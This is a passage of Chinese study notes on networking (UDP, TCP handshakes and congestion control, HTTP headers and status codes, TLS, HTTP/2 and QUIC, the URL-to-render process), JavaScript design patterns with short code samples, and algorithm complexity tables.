头标识下是 UDP 协议，然后就传递给应用层了 在接收端，网络层将数据传递给传输层，UDP 只去除 IP 报文头就传递给应用层，不会任何拼接操作。 不可靠性不可靠性体现在无连接上，通信都不需要建立连接，想发就发。不用备份，也不用关心对方是否已经正确接收到数据。UDP 没有拥塞控制，一直会以恒定的速度发送数据，即使网络条件不好，也不会对发送速率进行调整。这样实现的弊端是在网络条件不好的情况下可能会导致丢包，但是优点很明显是在某些实时性要求很高的场景（如电话会议）就需要使用 UDP 而不是 TCP 高效UDP 的头部开销小，只有八字节，相比 TCP 的至少二十字节要小得多，在传输数据报文时是很高效的。 UDP 头部包含了以下几个数据： 两个十六位的端口号，分别为源端口（可选字段）和目标端口 整个数据报文的长度 整个数据报文的检验和（IPv4 可选字段），该字段用于发现头部信息和数据中的错误 传输方式UDP 不止支持一对一的传输方式，同样支持一对多，多对一的方式，也就说说 UDP 提供了单播，多播，广播的功能。 适用的场景在很多实时性要求很高的地方都可以看到 UDP 的身影 直播如果使用基于 TCP 的协议，TCP 会严格控制传输的正确性，一旦有某个数据对端没有收到，就会停下来直到对端收到这个数据。这种问题在网络条件不错的情况下不会有问题，但是如果网络差就会变成画面卡着，然后在继续播放下一帧的情况。 TCP 这种情况下会降低用户体验，不适合 王者荣耀作者说不知道王者荣耀底层是使用了什么协议，但是对于这种实时性很高的游戏来说，UDP 是跑不了的。用户体量相当大的情况下，如果使用 TCP 连接可能会出现服务器不够用情况，因为每台服务器可供支撑的 TCP 连接数据是有限制的。 TCP 对于TCP 头部来说，以下几个字段是很重要的 Sequence number，这个序号保证了 TCP 传输的报文都是有序的，对端可以通过序号顺序的拼接报文 Acknowledgement Number，这个序号表示数据接收端期望接受的下一个字节编号是多少，同时也表示上一序号的数据已经收到 Window Size,窗口大小，表示还能接受多少字节的数据，用于流量控制 标识符 UGR=1：该字段为一表示本数据报的数据部分包含紧急信息，是一个高优先级数据报文，此时紧急指针有效。紧急数据一定位于当前数据包数据部分的最前面，紧急指标标明了紧急数据的尾部。 ACK=1：该字段为一表示确认号字段有效。此外，TCP 还规定在连接建立后传送的所有报文段都必须要把 ACK 置为一 PSH=1：该字段为一表示接收端应该立即将数据 push 给应用层，而不是等到缓冲区满后再提交 RST=1：该字段为一表示当前 TCP 连接出现严重问题，可能需要重新建立连接，也可以用于拒绝非法的报文段和拒绝连接请求 SYN=1：当 SYN = 1,ACK=0时，表示当前报文段是一个连接请求报文。当 SYN=1,ACK=1时，表示当前报文daunt是一个同意连接的应答报文 FIN=1：该字段为一表示此报文是一个释放连接的请求报文 状态机TCP 的状态机是很复杂的，并且与建立连接时的握手息息相关 一个重要的性能指标 RTT.该指标表示发送端发送数据到接收到对端所需的往返时间 建立连接三次握手 首先假设主动发起请求的一端为客户端，被动连接的一端称为服务端。不管是客户端还是服务端，TCP 连接建立完后都可以发送和接收数据，所以 TCP 是一个全双工的协议。 起初，两端都是 CLOSED 状态，在通信开始前，双方都会建立 TCB,服务端创建完TCB 后便进入 LISTEN 状态，此时开始等待客户端发送数据 第一次握手客户端向服务端发送连接请求报文段，该报文段中包含自身数据通讯初始序号。请求发送后，客户端便进入 SYN-SENT 状态 第二次握手服务端收到连接请求报文段后，如果同意连接，则会发送一个应答，该应答中也会包含自身的数据通讯初始序号，发送完成后便进入 SYN-RECEIVED 状态。 第三次握手当客户端收到连接同意的应答后，还要向服务端发送一个确认报文。客户端发完这个报文段后便进入 ESTABLISHED 状态，服务端接收到这个应答后也进入 ESTABLISHED 状态，此时连接建立成功 第三次握手中可以包含数据，通过快速打开（TFO）技术就可以实现这一功能。其中只要涉及到握手的协议，都可以使用类似 TFO 方式，客户端和服务端存储相同的 cookie ，下次握手发出 cookie 达到减少 RTT 的目的。 为什么TCP 建立连接需要三次握手，明明两次就可以建立起连接？ 因为这是为了防止出现失效的连接请求报文段被服务端接收后，从而产生错误。 如果客户端发送了一个连接报文请求A，但是因为网络原因造成了超时，这时 TCP 会启动超时重传的机制再次发送一个连接请求报文B。此时请求顺利达到服务器，服务端应答完就建立了请求，然后接受数据后释放了连接。 假设这时候请求 A 在两端关闭后终于达到了服务端，那么此时服务端会认为客户端有需要建立 TCP 连接，从而应答了该请求并进入了 ESTABLISHED 状态，但是实际上客户端是 CLOSED 状态，那么就会导致服务端一直等待，造成资源的浪费。 在建立连接中，任意一端掉线，TCP 都会重发 SYN 包，一般会重试5次，在建立连接可能遇到 SYN Flood 攻击。遇到这种情况可以选择调低重试次数或者干脆在不能处理的情况下拒绝请求。 断开连接四次握手 TCP 是全双工的，在断开连接时两端都需要发送 FIN 和 ACK 第一次握手若客户端 A 认为数据发送完成，则它需要向服务端 B 发送连接释放请求。 第二次握手B 收到连接释放请求后，会告诉应用层就要释放 TCP 连接，然后会发送 ACK 包，并进入 CLOSE_WAIT 状态，此时表明 A 到 B 的连接已经释放，不再接收 A 发的数据了。但是因为 TCP 连接是双工的，所以 B 依旧可以发送数据给 A 第三次握手B 如果此时还有没有发完的数据会继续发送，完毕后向 A 发送连接释放请求，然后 B 便进入 LAST-ACK 状态。通过延迟确认的技术（通常有时间限制，否则对方会误认为需要重传），可以将第二次和第三次握手合并，延迟 ACK 包的发送 第四次握手A 收到释放请求后，向 B 发送确认应答，A 进入 TIME-WAIT 状态。该状态会持续 2MSL(最大生存期，指报文段在网络中生存的时间，超时会被抛弃)时间，若该时间段内没有 B 的重发请求的话，就会进入 CLOSED 状态。当 B 收到确认应答后，也便进入 CLOSED 状态 为什么 A 要进入 TIME-WAIT 状态，等待 2MSL 时间后再进入CLOSED 状态？ 为了保证 B 能接受到 A 的确认应答，若 A 发完确认应答后直接进入 CLOSED 状态，如果确认应答因为网络问题一直没有到达，那么会造成 B 不能正常关闭 ARQ 协议ARQ 协议也就是超时重传机制。通过确认和超时机制保证了数据的正确送达，ARQ 协议包含停止等待 ARQ 和连续 ARQ 两种协议 停止等待 ARQ正常传输协议只要 A 向 B 发送一段报文，都要停止发送并且启动一个定时器，等待对端应答，在定时器内接收到对端应答就取消定时器并发送下一段报文 报文丢失或者出错在报文传输过程中可能会出现丢包，这时候超过定时器设定的时间就会再次发送丢失的数据直到对端响应，所以需要每次都备份发送的数据 即使报文正常传输到对端，有可能出现在传输过程中的报文出错的问题。这时候对端会抛弃该报文并等待 A 端重传 一般定时器设定的时间会大于一个 RTT 的平均时间 ACK 超时或者丢失对端传输的应答也可能出现丢失或者超时的情况，那么超过定时器时间 A 端照样会重报文，这时候 B 端会接收到相同序号的报文之后丢弃该报文并重传应答，直到 A 端发送下一个序号的报文。 在超时的情况下也可能会出现应答很迟到达，这时候 A 端会判断该序号是否已经接收过，如果接收过只需要丢弃应答即可。 假设在良好的网络环境中，每次发送数据都需要等待片刻肯定是不能接受的，这个协议看起来不是很高效。 连续ARQ在连续 ARQ 中，发送端拥有一个发送窗口，可以在没有收到应答的情况下持续发送窗口内的数据，这样相比停止等待 ARQ 协议来说减少了等待时间，提高了效率 累计确认连续 ARQ 中，接收端会持续不断收到报文，如果和停止等待 ARQ 中接收一个报文就发送一个应答一样，就太浪费资源了。通过累计确认，可以在收到多个报文以后统一回复一个应答报文。报文中的 ACK 标示位可以用来告诉发送端这个序号之前的数据已经全部接收到了，下次请发送这个序号后的数据。 但是累计确认也有一个弊端，在连续接收报文时，可能会遇到接收到序号5 的报文后，并未接收到序号6 的报文，然而序号7 的报文已经接收。遇到这种情况，ACK 只能回复 6，这样就会造成发送端重复发送数据的情况。 滑动窗口TCP 中，两端其实都维护者窗口，分别为发送端窗口和接收端窗口 发送端窗口包含已经发送但未收到应答的数据和可以发送但是未发送的数据 发送端窗口是由接收端窗口剩余大小决定的。接收方会把当前接收窗口的剩余大小写入应答报文，发送端收到应答后根据该值和当前网络拥塞情况设置发送窗口的大小，所以发送窗口的大小是不断变化的。 当发送端接收到应答报文后，会随着窗口进入滑动。 滑动窗口是一个很重要概念，它帮助了 TCP 实现了流量控制的功能。接收方通过报文告知发送方还可以发送多少数据，从而保证了接收方能够来得及接收数据，防止出现接收方带宽已满，但是发送方还是一直发送数据的情况。 zero 窗口在发送报文的过程中，可能会遇到对端出现零窗口的情况，在该情况下，发送端会停止发送数据，并启动 persistent timer.该定时器会定时发送请求给对端，让对端告知窗口大小。在重试次数超过一定次数后，可能会中断 TCP 链接。 拥塞处理拥塞处理和流量控制不同，后者是作用于接收方，保证接收方来得及接收数据，而后者是作用于网络，防止过多的数据拥塞网络，避免出现网络负载过大的情况。 拥塞处理包括了四个算法，分别是：慢开始，拥塞避免，快速重传，快递恢复 慢开始算法慢开始算法，就是在传输开始时将发送窗口慢慢指数等级扩大，从而避免一开始就传输最大量数据导致网络阻塞。 慢开始算法步骤具体如下： 连接初始设置拥塞窗口（Congestion Window）为 1 MSS(一个分段的最大数据量) 每过一个 RTT 将窗口大小乘二 指数级增加肯定不能没有限制的，所以有一个阈值限制，当窗口大于阈值就会启动拥塞避免算法 拥塞避免算法拥塞避免算法相比简单点，每过一个 RTT 窗口大小只加一，这样就能避免指数级增长导致网络拥塞，慢慢将大小调整到最佳值 在传输过程中可能定时器超时的情况，这时候 TCP 会认为网络拥塞，会马上进行一下步骤： 将阈值设定为当前拥塞窗口的一半 将拥塞窗口设定为 1MSS 启动拥塞避免算法 快速重传快速重传一般和快恢复一起出现。一旦接收端收到的报文出现失序的情况，接收端只会回复最后一个顺序正确的报文序号。如果发送端收到三个重复的 ACK ,无需等待定时器超时而是启动快速重传算法。具体是：TCP Taho 的实现： 将阈值设为当前阈值的一般 将拥塞窗口设为 1MSS 重新开始慢开始算法 TCP Reno 实现： 拥塞窗口减半 将阈值设定为当前拥塞窗口 进入块恢复阶段（重发对端需要的包，一旦接收到一个新的 ACK 答复就退出该阶段），这种方在丢失多个包的情况下就不那么友好了 使用拥塞避免算法 TCP New Ren 改进后的快恢复TCP New Reno 算法改进了之前 TCP Reno 算法的缺陷。在之前，快恢复中只要收到一个新的 ACK 包，就会退出快恢复。 在 TCP New Reno 中，TCP 发送方先记下三个重复 ACK 的分段的最大序号。 假如我有一个分段数据是 1 ~ 10 这十个序号的报文，其中丢失了序号为 3 和 7 的报文，那么该分段的最大序号就是 10。发送端只会收到 ACK 序号为 3 的应答。这时候重发序号为 3 的报文，接收方顺利接收的话就会发送 ACK 序号为 7 的应答。这时候 TCP 知道对端是有多个包未收到，会继续发送序号为 7 的报文，接收方顺利接收并会发送 ACK 序号为 11 的应答，这时发送端认为这个分段接收端已经顺利接收，接下来会退出快恢复阶段。 小结 TCP建立连接需要三次握手，断开连接需要四次握手 滑动窗口解决了数据的丢包、顺序不对和流量控制的问题 拥塞窗口实现了对流量的控制，保证全天候环境下最优的传递数据 HTTP 以及 TLSHTTP 请求的内容HTTP 请求由三部分组成，分别是： 请求行 首部 实体 请求行基本由请求方法、URL、版本协议组成。 请求方法分很多种，POST,GET,HEAD,OPTION,等等，更多具体的点击这里 副作用和幂等副作用是指对服务器上的资源做改变，搜素是无副作用的，注册是副作用的。 幂等指发送 M 和 N 次请求（两者不同且大于1），服务器上资源的状态一致，比如注册10个和11个账号是不幂等的，对文章进行更改10次和11次是幂等的。因为前者多了一个账号（资源），后者只是更新同一个资源 在规范的应用场景来说，Get 多用于无副作用的，幂等的场景，例如搜索关键字。Post 多用于副作用的，不幂等的场景，例如注册 技术上来说： Get 请求能缓存，Post 不能 Post 相对 Get 安全一点，因为GET 请求都包含在 URL 里面，且会被浏览器保存历史记录。而 Post 不会，但是在抓包的情况下是一样的。 URL 有长度限制，会影响 GET 请求，但是这个长度限制是浏览器限制的，不是 RFC 规定的 Post 支持更多的编码并且不对数据类型限制 首部首部分成请求首部和响应首部，并且部分首部两种通用。下面是常见的首部 通用首部 通用字段 作用 Cache-Control 控制缓存的行为 Connection 浏览器想要优先使用的连接类型，比如 keep-alive Date 创建报文的时间 Pragma 报文指令 Via 代理服务器相关信息 Transfer-Encoding 制定报文主体的传输编码方式 Upgrade 要求客户端升级协议 Warning 在内容中可能存在错误 具体解释的可以点击这里 请求首部 请求首部 作用 Accept 能正确接收的媒体类型 Accept-Charset 能正确接收的字符集 Accept-Encoding 能正确接收的编码格式列表 Accept-Language 能正确接收的语言列表 Expect 期待服务端的指定行为 From 请求方邮箱地址 Host 服务器的域名 If-Match 两端资源标记比较 If-Modified-Since 本地资源未修改返回 304（比较时间） If-None-Match 本地资源未修改返回 304（比较标记） User-Agent 客户端信息 Max-Forwards 限制可被代理以及网关转发的次数 Proxy-Authorization 向代理服务器发送验证信息 Range 请求某个内容的一部分 Referer 表示浏览器所访问的前一个页面 TE 传输编码方式 响应首部 响应头部 作用 Accept-Ranges 是否支持某些种类的范围 Age 资源在代理缓存中存在的时间 ETag 资源标识 Location 客户端重定向到某个 URL Proxy-Authenticate 想代理服务器发送验证信息 Server 服务器名字 WWW-Authenticate 获取资源需要的验证信息 实体首部 实体首部 作用 Allow 资源的正确请求方式 Content-Encoding 内容编码的格式 Content-Language 内容使用的语言 Content-Length request body 长度 Content-Location 返回数据的备用地址 Content-MD5 Base64 加密格式的内容 MD5 校验值 Content-Range 内容的位置范围 Content-Type 内容的媒体类型 Expires 内容的过期时间 Last_modified 内容的最后修改时间 常见的状态码状态码的责任是当客户端向服务端发送请求时，描述返回的请求结果。借助状态码，用户可以知道服务单是正常处理了请求，还是出现了错误。 状态码的类别 类别 原因短语 1XX Information（信息性状态码） 接受的请求正在处理 2XX Success（成功状态码） 请求正常处理完毕 3XX Redirection（重定向状态码） 需要进行附加操作以完成请求 4XX Client Error（客户端错误状态码） 服务器无法处理请求 5XX Server Error（服务器错误状态码） 服务器处理请求出错 2XX 成功 200 OK,表示从客户端发来的请求在服务端被正确处理 204，No content，表示请求成功，但响应报文不含实体的主体部分 205，Reset Content，表示请求成功，但响应报文不含实体的主体部分，与204响应不同的是要求请求方重置内容 206 Partial Content，表示对客户端进行了范围请求，而服务器成功执行了这部分的 GET 请求，响应报文中由 Content-Range 指定范围的实体内容 3XX 重定向 301 moved permanently,永久性重定向，表示资源已被分配到了新的 URL 302 found,临时重定向，表示资源临时被分配了新的 URL 303 see other，表示资源存在着另一个 URL应使用 GET 方法获取资源 304 not modified，表示服务器允许访问资源，但因发生请求未满足条件的情况 307 temporary redirect，临时重定向，和302含义类似，但是期望客户端保持请求方法不变向新的地址发出请求。 4XX 客户端错误 400 bad request，请求报文存在语法错误 401 unauthorized，表示发送的请求需要有通过 HTTP 认证的认证消息 403 fobidden，表示对请求资源的访问被服务器拒绝 404 no found,表示在服务器上没有找到请求的资源 5XX 服务器错误 500 internal server error,表示服务器端在执行请求时发生了错误 501 Not Implemented,表示服务器不支持当期请求所需要的某个功能 503 service unavaliable,表示服务器暂时处于超负载或者停机服务，无法处理请求 TLSHTTPS 通过 HTTP 来传输信息，但是信息通过 TLS 协议进行了 加密 TLS 协议位于传输层之上，应用层之下。首先进行 TLS 协议传输需要两个 RTT,可以通过 Session Resumption 减少到一个 RTT 在 TLS 中使用了两种加密技术，分别为：对称加密和非对称加密。 对称加密对称加密就是两边都拥有相同的密钥，两边都知道药怎么将密文加密解密 这种加密方式缺点在于因为传输数据走的都是网络，如果密钥被截获那就没有加密的意义了 非对称机密有公钥私钥之分，公钥所有人都可以知道，如果将数据用公钥加密，但是将数据解密必须使用私钥解密，私钥只有分发公钥的一方才知道。 这种加密方式就可以完美解决对称加密存在的问题，假设两端都需要使用对称加密，那么在这之前，可以先使用非对称加密交换密钥。 简单流程化如下：服务端将公钥发布出去，那么客户端也知道公钥，就下来客户端创建了一个密钥，然后通过公钥加密后发送给服务端，服务端接收到私钥解密出正确的密钥，这时候两端就都知道密钥是什么了。 TLS 握手过程如下图： 客户端发送一个随机值以及需要的协议和加密方式 服务端收到客户端的随机值，自己也产生了一个随机值，并根据客户端的需求的协议和加密方式来使用对应的方式，并且发送自己的证书（如果需要验证客户端证书需要说明） 客户端收到服务端的证书验证是否有效，验证通过会生成一个随机值，通过服务端证书的公钥加密这个随机值并发送给服务端，如果服务端需要验证客户端证书的话会附带证书 服务端收到加密过的随机值并使用私钥解密获得三个随机值，这时候两端都有三个随机值，可以通过这三个随机值按照之前的约定的加密方式生成密钥，接下来的通信既可以使用该密钥加密解密了。 通过上面步骤，可以知道 TLS 握手阶段，两端使用非对称加密的方式进行通信，但是因为非对称加密损耗的性能比对称加密大，所以在正式传输数据的时候，两端使用对称加密的方式进行通信。 关于 http 安全的具体可以点击这里 HTTP/2 以及 HTTP/3HTTP/2 很好的解决了当下最常用的 HTTP/1 所存在的一些性能问题，只需要升级到该协议就可以减少很多之前需要做的性能优化工作，当然兼容问题以及如何优雅降级应该是国内还不普遍使用的原因之一。 虽然 HTTP/2 已经解决了很多问题，但是并不代表它已经是完美的了，HTTP/3 就是为了解决 HTTP/2 所存在的一些问题而被推出来的。 HTTP/2HTTP/2 相比对 HTTP/1 可以说是大幅度提高了网页的性能。 在 HTTP/1 为了性能考虑，我们会引入雪碧图、将小图内联、使用多个域名等等的方式。这一切都是因为浏览器限制了同一个域名下的请求数量（Chrome 下一般是限制六个连接），当页面中需要请求很多资源的时候，队头阻塞（Head of line blocking）会导致在达到最大请求数量时，剩余的资源需要等待其他资源请求完成后才能发起请求。 在 HTTP/2 中引入了多路复用的技术，这个技术可以只通过一个 TCP 连接就可以传输所有的请求数据。多路复用很好的解决了浏览器限制同一个域名下的请求数量的问题，同时也接更容易实现全速传输，毕竟新开一个 TCP 连接都需要慢慢提升传输速度。 大家可以通过 该链接 感受下 HTTP/2 比 HTTP/1 到底快了多少。 二进制传输HTTP/2 中所有加强性能的核心在于此，在之前的 HTTP 版本，我们是通过文本的方式传输数据，在 HTTP/2 中引入了新的编码机制，所有的传输数据都会被分割，并采用二进制格式编码。 多路复用在 HTTP/2 中有两个非常重要的概念，分别是 帧（frame）和 流 （stream） 帧代表着最小的数据单位，每个帧都会标识出该帧属于哪个流，流也就是多个帧组成的数据流 多路复用，就是在一个 TCP 连接中可以存在多条流。换句话说，就是可以发送多个请求，对端可以通过帧中的标识知道属于哪个请求。通过这个技术，可以避免 HTTP 旧版本中的对头阻塞的问题，极大提高了传输的性能。 Header 压缩在 HTTP/1 中使用文本的形式传输 header，在 header 携带 cookie 的情况下，可能每次都需要重复传输几百到几千字节。 在 HTTP/2 中使用 HPACK 压缩格式对传输的 header 进行编码，减少了 header 的大小。并在两端维护了索引表，用于记录出现过的 header。后面在传输过程中可以传输以及记录过的 header 的键名，对端收到的数据后就可以通过键名找到对应的值 服务端 Push在 HTTP/2 中，服务端可以在客户端某个请求后，主动推送其他资源 某些资源客户端是一定会请求的，这时候可以采用服务端 push 的技术，提前给客户端推送必要的资源，这样就可以相对减少一点延迟时间。当然在浏览器兼容的情况下也可以使用 prefetch HTTP/3底层的 TCP 协议导致 HTTP/2 版本存在一个问题，因为使用了多路复用，一般来说同一个域名下面只需要一个 TCP 连接。当这个连接中出现了丢包的情况，就会导致 HTTP/2 的表现不如 HTTP/1 在丢包的情况下，整个 TCP 都要开始等待重传，就导致了后面的所有的数据都会被阻塞。但是对于 HTTP/1 来说可以开启多个 TCP 连接，出现这种情况只会影响一个连接，剩余的 TCP 连接可以正常传输数据 这个协议是由操作系统实现的，如果要去修改 TCP 协议看起来不怎么现实。 基于这个原因，Google 就更起炉灶搞了一个基于 UDP 协议的 QUIC 协议，并且使用在了 HTTP/3 上， HTTP/3 之前名为 HTTP-over-QUIC QUICUDP 协议虽然效率很高，但是并不是那么的可靠.QUIC 是基于 UDP ,在原生的基础上新增了很多功能，比如多路复用、0-RTT、使用 TLS1.3 加密、流量控制、有序交付、重传等功能。 多路复用虽然 HTTP/2 支持多路复用，但是 TCP 协议终究是没有这个功能的。QUIC 就原生实现了这个功能，并且传输的单个数据流可以保证有序交付但不会影响其他的数据流，这样的技术就解决了之前的 TCP 存在的问题。 并且 QUIC 在移动端会比 TCP 好，因为 TCP 是基于 IP 和端口去识别连接的，这种方式在多变的移动端网络环境下是很脆弱的。但是因为 QUIC 是通过 ID 的方式去识别一个连接的，不会随着网络的变化而变化，可以迅速重连上。 0-RRT通过使用类似 TCP 的快速打开的技术，缓存当前会话的上下文，在下次恢复会话的时候，只需要将之前的缓存传递给服务端验证通过就可以进行传输了。 纠错机制假如说这次我要发送三个包，那么协议会算出这三个包的异或值并单独发出一个校验包，也就是总共发出了四个包。当出现其中的非校验丢包的 情况的时候，可以通过另外三个包计算出丢失的数据包的内容。 当然这种技术只能使用在丢失一个包的情况下，如果出现丢失多个包就不能使用纠错机制了，只能使用重传的方式了。 小结 HTTP/2 通过多路复用、二进制流、header 压缩等技术，极大提高了性能，但是还是存在着问题 QUIC 基于 UDP 实现，是 HTTP/3 中底层支撑协议，该协议基于 UDP，而且拿了 TCP 中的精华，实现了又快有可靠的协议 关于 HTTP/3 更多点击这里 输入 URL 到页面渲染的整个过程首先是 DNS 查询，如果这一步做到了智能 DNS 解析的话，会提供速度最快的 IP 地址回来 DNSDNS 的作用就是通过域名查询到具体的 IP 地址 因为 IP 存在数据和英文的组合（IPv6），不利于记忆，所以就出现了域名，可以把它看成某个 IP 地址的别名，DNS 就是通过这个别名去查询真正的名字是什么 在 TCP 握手之前以及先进行了 DNS 查询，这个查询是操作系统自己做的，在浏览器中访问 www.googel.com 的时候，会进行以下的操作： 操作系统会首先在本地缓存中查询 IP 没有的话就会去系统配置的 DNS 服务器中查询 如果这时候还没有找到，就会直接去 DNS 根服务器查询，这一步查询会找出负责 com这个域名的服务器 然后去该服务器查询 google这个二级域名 接下来是三级域名的查询，这个是我们自己配置的，可以给 www 这个域名配置一个IP,然后还可以给别的三级域名配置一个 IP 上面是DNS 迭代查询，还有一种格式递归查询，区别就是前者是由客户端去做请求，后者是由系统配置的 DNS 服务器做请求，得到结果将数据返回给客户端。 DNS 是基于 UDP 做的查询 接下来是 TCP 握手协议，应用层会下发数据给传输层，这里的 TCP 协议会指明两端的端口号，然后下发给网络层。网络层的 IP 协议会确定 IP 地址，并制定了数据传输中如何跳转路由器。然后包会再被封装到数据链路层的数据帧结构中，最后就是物理层面的传输了。 在这一部分中，TCP 握手结束后，会进行 TLS 握手，然后开始正式的传输数据了。 数据在进入服务端之前，可能还会警告负责负载均衡的服务器，它的作用是将请求合理的分发到多态服务器上面，这时假设服务端会响应一个 HTML 文件 首先浏览器会判断状态码是什么，如果是200 就继续解析，如果是 400 或者 500 的话就会报错，如果是 300 就会重定向，这里会有一个 重定向计数器，避免多次的重定向，超过次数也会报错。 浏览器开始解析文件，如果是 gzip 格式的会先解压一下，然后通过文件的编码格式知道该如何取解码文件。 文件解码后就会正式开始渲染流程，先根据 HTML 创建 DOM 树，有 CSS 的话就是 CSSOM 树，如果遇到 script 标签的话，会判断是否存在 async 或者 defer,前者会并行进行下载并执行 JS,后者会先下载文件，然后等待 HTML 解析完成后顺序执行。 如果以上都没有，就会阻塞住渲染流程直到 JS 执行完毕。遇到下载文件就会去下载文件，如果使用 HTTP/2 协议的话就会极大提高多图的下载效率 CSSOM 树 和 DOM 树构建完成之后会生成 render 树，这一步就是确定页面布局、样式等诸多方面的东西。 在生成 Render 树的过程中，浏览器就会开始调用 GPU 绘制，合成图层，将内容显示在 屏幕上了。 关于这个流程，更多的可以点击这里 设计模式关于具体的设计模式我有过一些笔记 下面还是根据作者的脚步来回顾这一点知识点 工厂模式有一份很复杂的代码需要用户去调用，但是用户并不关心这些代码是怎么实现的，只需要提供一个接口去调用，用户只负责传递需要的参数。参数的使用都在内部逻辑去完成，不暴露出来给用户。只要给用户返回一个实例，这种构造过程就是工厂。 简而言之就是隐藏了创建实例的复杂度，只需要提供一个接口 12345678910111213141516class Man&#123; constructor(name)&#123; this.name = name &#125; alertName()&#123; alert(this.name) &#125;&#125;class Factory&#123; static create(name)&#123; return new Man(name) &#125;&#125;Factory.create('haha').alertName() Vue 源码中，也可以看到工厂模式的使用，比如创建异步组件 12345678910111213141516171819export function createComponent( Ctor: Class&lt;Component&gt; | Function | Object | void, data: ?VNodeData, context: Component, children: ?Array&lt;VNode&gt;, tag?: string): VNode | Array&lt;VNode&gt; | void &#123; // 逻辑处理... const vnode = new VNode( `vue-component-$&#123;Ctor.cid&#125;$&#123;name ? `-$&#123;name&#125;` : &apos;&apos;&#125;`, data, undefined, undefined, undefined, context, &#123; Ctor, propsData, listeners, tag, children &#125;, asyncFactory ) return vnode&#125; 在上述代码中，我们可以看到我们只需要调用 createComponent 传入参数就能创建一个组件实例，但是创建这个实例是很复杂的一个过程，工厂帮助我们隐藏了这个复杂的过程，只需要一句代码调用就能实现功能。 单例模式单例模式很常用，比如全局缓存、全局状态管理等等只需要一个对象，就可以使用单例模式 单例模式的核心就是保证全局只有一个对象可以访问。因为 JS 是门无类的语言，所以别的语言实现单例的方式不能套入 JS 中，我们需要用一个变量确保值创建一次就可以了，下面是如何实现单例模式的例子： 12345678910111213141516class Singleton &#123; constructor() &#123; &#125;&#125;Singleton.getInstance = (function () &#123; let instance; return function () &#123; if (!instance) &#123; instance = new Singleton() &#125; return instance; &#125;&#125;)()let s1 = new Singleton.getInstance();let s2 = new Singleton.getInstance();console.log(s1 === s2); // true 在 Vuex 源码中也可以看到单例模式的运用，虽然实现的方式不大一样，通过一个外部变量来控制只安装一次 Vuex 123456789let Vue // bind on installexport function install (_Vue)&#123; if(Vue &amp;&amp; Vue === Vue)&#123; // 如果发现 Vue 有值，就不重新创建实例了 return; &#125; Vue = _Vue; applyMixin(Vue)&#125; 适配器模式适配器用来解决两个接口不兼容的情况，不需要改变已有的接口，通过包装一层的方式实现两个接口的正常协作 简单实现： 12345678910111213141516class Plug&#123; getName()&#123; return '港版插头' &#125;&#125;class Target&#123; constructor()&#123; this.plug = new Plug() &#125; getName()&#123; return this.plug.getName() + ' 适配转二脚插头' &#125;&#125;let target = new Target();target.getName(); // 港版插头 适配转二脚插头 在 Vue 中经常使用到适配器模式，比如父组件传递给子组件一个时间戳属性，组件内部需要将时间戳转为正常的日期显示，一般会使用 computed 来做转换这件事情，这个过程就是用到了适配器模式 装饰模式装饰模式不需要改变已有的接口，作用是给对象添加功能，就像我们经常需要给手机戴个保护套防摔一样，不改变手机自身，给手机添加了保护套提供防摔的功能。 以下是如何实现装饰模式的例子，使用了 ES7 中的装饰器语法 123456789101112function readonly(target,key,descriptor)&#123; descriptor.writable = false; return descriptor&#125;class Test&#123; @readonly name = 'haha'&#125;let t = new Test();t.haha = '11'; // 不可修改 在 React 中，装饰模式是随处可见的 12345import &#123; connect &#125; from 'react-redux';class MyComponent extends React.Component&#123; // ..&#125;export default connect(mapStateToProps)(MyComponent) 代理模式代理是为了控制对对象的访问，不让外部直接访问到对象，事件代理也是用到了代理模式 12345678910111213&lt;ul id="ul"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt;&lt;/ul&gt;&lt;script&gt; let ul = document.querySelector('#ul'); ul.addEventListener('click',(e)=&gt;&#123; console.log(e.target); &#125;)&lt;/script&gt; 因为存在太多 li，不可能每个都去绑定事件，这时候可以通过给父节点绑定一个事件，让父节点作为代理去拿到真实点击的节点。 发布-订阅模式发布-订阅模式也叫做观察者模式，通过一对一或者一对多的依赖关系，当对象发生改变的时候，订阅方都会收到通知。现实生活中的例子是当我需要在购物网站购买一个产品的时候，但是发现该产品目前处于缺货状态，这时候我们可以点击有货通知的按钮，让网站在产品有货的时候通过短信通知我。 在实际代码中，其实发布-定于模式也很常见，比如我们点击一个按钮触发了点击事件其实就是使用了该模式 1234567&lt;ul id="ul"&gt;&lt;/ul&gt;&lt;script&gt; let ul = document.querySelector('#ul'); ul.addEventListener('click',(e)=&gt;&#123; console.log(e.target); &#125;) &lt;/script&gt; 在 Vue 中，如何实现响应式也是使用了该模式，对于需要实现想爱你过隐式的对象来说，在 get 的时候会进行依赖手机，当改变了对象的属性的时候，就会触发派发更新 外观模式外观模式提供了一个接口，隐藏了内部的逻辑，更加方便外部的调用 我们需要实现一个兼容多种浏览器的添加事件方法 12345678910function addEvent(elm, evType, fn, useCapture) &#123; if (elm.addEventListener) &#123; elm.addEventListener(evType, fn, useCapture); return true &#125; else if (elm.attachEvent) &#123; return elm.attachEvent('on' + evType, fn) &#125; else &#123; elm["on" + evType] = fn &#125;&#125; 对于不同的浏览器，添加事件的方式可能会存在兼容问题，如果每次都要这样写一遍是不可能，我们将逻辑判断统一在一个接口里面，外部需要添加事件只需要调用 addEvent 就可以了 常见数据结构关于数据结构我之前的笔记也有过记录，具体的可以点击这里 下面还是跟着作者来重温一遍常见的数据结构 大O表示法如何衡量算法的效率？通常是用资源，例如CPU（时间）占用、内存占用、硬盘占用和网络占用。当讨论大O表示法时，一般考虑的是CPU（时间）占用。 分析算法时，时常遇到以下几类函数 符号 名称 O(1) 常数的 O(log(n)) 对数的 O((log(n)c)) 对数多项式的 O(n) 线性的 O(n2) 二次的 O(nc) 多项式的 O(cn) 指数的 常用数据结构的时间复杂度数据结构 数据结构 一般情况 最差情况 插入 删除 搜索 插入 删除 搜索 数组-栈-队列 O(1) O(1) O(n) O(1) O(1) O(n) 链表 O(1) O(1) O(n) O(1) O(1) O(n) 双向链表 O(1) O(1) O(n) O(1) O(1) O(n) 散列表 O(1) O(1) O(1) O(n) O(n) O(n) 二分搜索树 O(log(n)) O(log(n)) O(log(n)) O(n) O(n) O(n) AVL树 O(log(n)) O(log(n)) O(log(n)) O(log(n)) O(log(n)) O(log(n)) 排序算法 算法（用于数组） 最好情况 一般情况 最差情况 冒泡排序 O(n) O(n2) O(n2) 选择排序 O(n2) O(n2) O(n2) 插入排序 O(n) O(n2) O(n2) 归并排序 O(nlog(n)) O(nlog(n)) O(nlog(n)) 快速排序 